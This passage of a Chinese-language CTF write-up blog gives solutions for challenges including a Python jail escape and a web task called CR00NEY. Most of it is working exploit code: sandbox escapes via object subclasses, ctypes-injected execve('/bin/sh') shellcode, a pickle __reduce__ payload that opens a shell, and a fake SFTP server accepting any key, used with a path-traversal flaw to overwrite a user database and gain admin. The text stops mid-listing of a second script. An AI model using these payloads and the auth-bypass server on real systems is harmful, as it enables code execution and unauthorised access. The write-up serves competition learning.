<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;ctypes=__import__(&#x27;ctypes&#x27;);m=__import__(&#x27;o&#x27;+&#x27;s&#x27;);libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b&#x27;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&#x27;;ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)&quot;,().__class__.__base__.__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;])</span><br></pre></td></tr></table></figure>

<p>其它解法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[(b:=&#x27;&#x27;.__class__.__base__.__subclasses__()[-2].__init__.__builtins__),(e:=b[&quot;e&quot;&quot;val&quot;]),(a:=e(&quot;breakpoint()&quot;,(bb:=&#123;&quot;__builtins__&quot;:b&#125;),bb))]</span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">x = 117</span><br><span class="line">addr = id(x)</span><br><span class="line">ptr = ctypes.cast(addr + 24, ctypes.POINTER(ctypes.c_uint32))</span><br><span class="line">ptr[0] = 106</span><br><span class="line">exit</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">[(b:=&#x27;&#x27;.__class__.__base__.__subclasses__()[-2].__init__.__builtins__),(i:=b[&quot;__import__&quot;]),(g:=b[&quot;getattr&quot;]),(o:=i(&quot;o&quot;&quot;s&quot;)),(s:=g(o,&quot;sys&quot;&quot;tem&quot;)),(a:=s(&quot;/bin/sh&quot;))]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Return an object with a __reduce__ method, classic pickle unserialize</span><br><span class="line">(b:=().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__, b[&#x27;globals&#x27;]().update(&#123;&#x27;__builtins__&#x27;: b&#125;), b[&#x27;exec&#x27;](&quot;class PAYLOAD():\n def __reduce__(self):\n  command=\&quot;eval(input(&#x27;PAYLOAD 2:&#x27;))\&quot;\n  return (eval, (command,))&quot;), x:=[], x.append(y.gi_frame.f_back.f_back.f_locals for y in x), z:=[*x[0]], z[0].update(&#123;&quot;success&quot;:PAYLOAD()&#125;))</span><br><span class="line"></span><br><span class="line"># This will run when the `success` variable is un-pickled, in the main interpreter</span><br><span class="line">(exec(&quot;threading.Thread = lambda **_:__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;), True)[1]</span><br></pre></td></tr></table></figure>

<h2 id="CR00NEY"><a href="#CR00NEY" class="headerlink" title="CR00NEY"></a>CR00NEY</h2><p>题目附件代码看起来比较多, 但是关键逻辑就几点</p>
<ul>
<li><code>/app/api/admin/route.js</code> 是获取flag的地方 对应路由<code>/api/admin</code></li>
<li>注册登录</li>
<li>从给定的sftp服务器下载文件到本地, 并返回文件中的内容. 题目默认在本地开了一个sftp, 因此可以下载文件, 包括sqlite的.db文件并查看内容</li>
</ul>
<p>获取flag的地方</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!user || !user.<span class="property">admin</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden&#x27;</span> &#125;, &#123; <span class="attr">status</span>: <span class="number">403</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">ADMIN_FLAG</span> || <span class="string">&#x27;No flag set&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; flag &#125;);</span><br></pre></td></tr></table></figure>

<p>需要admin字段鉴权以确定是都能拿到flag, 去看users表结构<br><img src="/2025/08/29/TFCCTF-2025/1.png" alt="alt text"></p>
<p>再看注册逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">POST</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = <span class="keyword">await</span> request.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(</span><br><span class="line">      &#123; <span class="attr">error</span>: <span class="string">&#x27;Missing username or password&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">status</span>: <span class="number">400</span> &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">initDb</span>();</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> <span class="title function_">openDb</span>();</span><br><span class="line">  <span class="keyword">const</span> hashedPassword = <span class="keyword">await</span> bcrypt.<span class="title function_">hash</span>(password, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">run</span>(</span><br><span class="line">      <span class="string">&#x27;INSERT INTO users (username, password) VALUES (?, ?)&#x27;</span>,</span><br><span class="line">      username,</span><br><span class="line">      hashedPassword</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">NextResponse</span>.<span class="title function_">json</span>(</span><br><span class="line">      &#123; <span class="attr">error</span>: <span class="string">&#x27;User already exists&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">status</span>: <span class="number">409</span> &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有指定admin字段值. 也就是所有注册用户都为非admin,不能读取flag, 并且浏览附件发现默认并没有初始化一个admin账户. 所以就算下载到users.db也没有admin账户</p>
<p>思路是通过题目中的sftp文件下载, 让他去我们的恶意服务器上下载users.db并覆盖到原有的users.db, 这样就可以成功越权</p>
<p>客户端关键代码是这样的:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">SSH_File_Download</span>(<span class="params">ctx: ssh_ctx</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; host, username, filename, keyPath &#125; = ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> safeRemoteName = <span class="title function_">basename</span>(filename);</span><br><span class="line">  <span class="keyword">const</span> safeLocalName = filename;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">hasBlockedExtension</span>(safeRemoteName) || <span class="title function_">hasBlockedExtension</span>(safeLocalName)) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Refused: writing code files is not allowed.&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> fsp.<span class="title function_">mkdir</span>(<span class="string">&quot;/app/downloads&quot;</span>, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> localPath = <span class="string">&quot;/app/downloads/&quot;</span> + safeLocalName;</span><br><span class="line">  <span class="keyword">const</span> remotePath = <span class="string">&quot;/app/&quot;</span> + safeRemoteName;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sftp = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">connect</span>(&#123;</span><br><span class="line">      host,</span><br><span class="line">      username,</span><br><span class="line">      <span class="attr">privateKey</span>: fs.<span class="title function_">readFileSync</span>(keyPath),</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">fastGet</span>(remotePath, localPath);</span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">end</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> fsp.<span class="title function_">chmod</span>(localPath, <span class="number">0o600</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;Successfully downloaded the file&quot;</span>,</span><br><span class="line">      <span class="attr">path</span>: localPath,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="attr">error</span>: any) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> sftp.<span class="title function_">end</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">message</span>: error?.<span class="property">message</span> || <span class="string">&quot;SFTP error&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> safeRemoteName = <span class="title function_">basename</span>(filename);</span><br><span class="line"><span class="keyword">const</span> safeLocalName = filename;</span><br></pre></td></tr></table></figure>

<p>客户端在将获取到的文件保存到本地时是可以目录穿越的, 所以就可以绕过后面的:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> localPath = <span class="string">&quot;/app/downloads&quot;</span> + <span class="string">&quot;/&quot;</span> +safeLocalName;</span><br></pre></td></tr></table></figure>

<p>将从服务端获取到的文件保存到客户端任意位置</p>
<p>由于进行了私钥验证, 此时就让ai写个服务端, 任何私钥都能通过验证:</p>
<p>fake_server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时生成的 SSH host key</span></span><br><span class="line">HOST_KEY = paramiko.RSAKey.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工作目录，只允许访问这里的文件</span></span><br><span class="line">WORK_DIR = <span class="string">&quot;/app&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AlwaysAllowServer</span>(paramiko.ServerInterface):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;允许任何私钥/密码通过认证&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_channel_request</span>(<span class="params">self, kind, chanid</span>):</span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">&quot;session&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_auth_publickey</span>(<span class="params">self, username, key</span>):</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_auth_password</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_allowed_auths</span>(<span class="params">self, username</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;publickey,password&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleSFTPHandler</span>(paramiko.SFTPServerInterface):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;SFTP 文件操作处理，只允许访问 WORK_DIR 下的文件&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_to_local</span>(<span class="params">self, path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将客户端传来的相对路径映射到 WORK_DIR</span></span><br><span class="line"><span class="string">        拒绝访问 WORK_DIR 外的文件</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 移除开头的斜杠，确保是相对路径</span></span><br><span class="line">        relative_path = path.lstrip(<span class="string">&quot;/\\&quot;</span>)</span><br><span class="line">        local_path = os.path.abspath(os.path.join(WORK_DIR, relative_path))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 安全检查：必须在 WORK_DIR 内</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> local_path.startswith(os.path.abspath(WORK_DIR)):</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> local_path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_folder</span>(<span class="params">self, path</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] list_folder <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        files = os.listdir(local_path)</span><br><span class="line">        attrs = []</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            st = os.stat(os.path.join(local_path, f))</span><br><span class="line">            attrs.append(paramiko.SFTPAttributes.from_stat(st, filename=f))</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stat</span>(<span class="params">self, path</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] stat <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            st = os.stat(local_path)</span><br><span class="line">            <span class="keyword">return</span> paramiko.SFTPAttributes.from_stat(st)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">    lstat = stat</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self, path, flags, attr</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] open <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        mode = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flags &amp; os.O_WRONLY:</span><br><span class="line">            mode = <span class="string">&quot;wb&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> flags &amp; os.O_RDWR:</span><br><span class="line">            mode = <span class="string">&quot;rb+&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mode = <span class="string">&quot;rb&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(local_path, mode)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">        handle = paramiko.SFTPHandle(flags=flags)</span><br><span class="line">        handle.readfile = f <span class="keyword">if</span> <span class="string">&quot;r&quot;</span> <span class="keyword">in</span> mode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        handle.writefile = f <span class="keyword">if</span> <span class="string">&quot;w&quot;</span> <span class="keyword">in</span> mode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> handle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sftp_server</span>(<span class="params">host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">22</span></span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((host, port))</span><br><span class="line">    sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] SFTP server listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client, addr = sock.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        t = paramiko.Transport(client)</span><br><span class="line">        t.add_server_key(HOST_KEY)</span><br><span class="line"></span><br><span class="line">        server = AlwaysAllowServer()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t.start_server(server=server)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] SSH negotiation failed:&quot;</span>, e)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 挂载 SFTP 子系统</span></span><br><span class="line">        t.set_subsystem_handler(<span class="string">&quot;sftp&quot;</span>, paramiko.SFTPServer, SimpleSFTPHandler)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.makedirs(WORK_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(WORK_DIR, <span class="string">&quot;test.txt&quot;</span>), <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;Hello from fake SFTP server\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    start_sftp_server()</span><br></pre></td></tr></table></figure>

<p>需要安装paramiko依赖</p>
<p>有点小bug, 要把事先准备好的users.db放在&#x2F;app&#x2F;app&#x2F;目录下</p>
<p>然而直接覆盖users.db也不行, 题目对users.db进行了校验<br><img src="/2025/08/29/TFCCTF-2025/2.png" alt="alt text"></p>
<p>依旧是ai生成脚本来修改获得恶意users.db, 使得它通过DB_id校验</p>
<p>message.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span 